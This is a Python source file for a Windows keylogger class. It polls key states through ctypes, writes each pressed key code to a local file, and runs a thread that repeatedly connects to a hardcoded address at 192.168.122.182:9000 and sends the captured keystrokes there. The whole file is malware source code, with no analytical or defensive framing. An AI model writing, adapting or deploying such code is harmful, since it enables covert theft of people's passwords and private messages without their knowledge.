import ctypes
import socket
import os
import sys
import threading
from time import sleep

class Keylogger:
    def __init__(self):
        self.log_file = open('keylogs.txt', 'w')
        self.server_addr = ('192.168.122.182', 9000)
        self.socket_instance = None
        self.is_connected = False

    def connect_to_server(self):
        while not self.is_connected:
            try:
                self.socket_instance = socket.socket()
                self.socket_instance.connect(self.server_addr)
                self.is_connected = True
                print('Connected to server')
            except (ConnectionRefusedError, TimeoutError):
                sleep(5)  # Retry after 5 seconds
                print('Failed to connect to the server. Retrying...')

    def transmit_logs(self):
        self.connect_to_server()
        while self.is_connected:
            if os.path.getsize('keylogs.txt') > 0:  # If log file is not empty
                with open('keylogs.txt', 'r+') as f:
                    data = f.read()
                    f.truncate(0)  # Clear the file without changing its size
                try:
                    self.socket_instance.sendall(data.encode())
                except (ConnectionResetError, BrokenPipeError):
                    print('Lost connection to server')
                    self.is_connected = False
            sleep(5)  # Check for new logs every 5 seconds
        self.socket_instance.close()

    def start_logging(self):
        keyboard_listener = threading.Thread(target=self.listen_for_keypresses)
        transmitter = threading.Thread(target=self.transmit_logs)
        keyboard_listener.start()
        transmitter.start()
        keyboard_listener.join()  # Main thread waits for these threads to finish before exiting
        transmitter.join()

    def listen_for_keypresses(self):
        while True:
            for key in range(0x20, 0xFE):
                if ctypes.windll.user32.GetAsyncKeyState(key):  # If the key is pressed
                    print('Pressed:', str(key))
                    self.log_file.write(str(key) + '\n')
                    self.log_file.flush()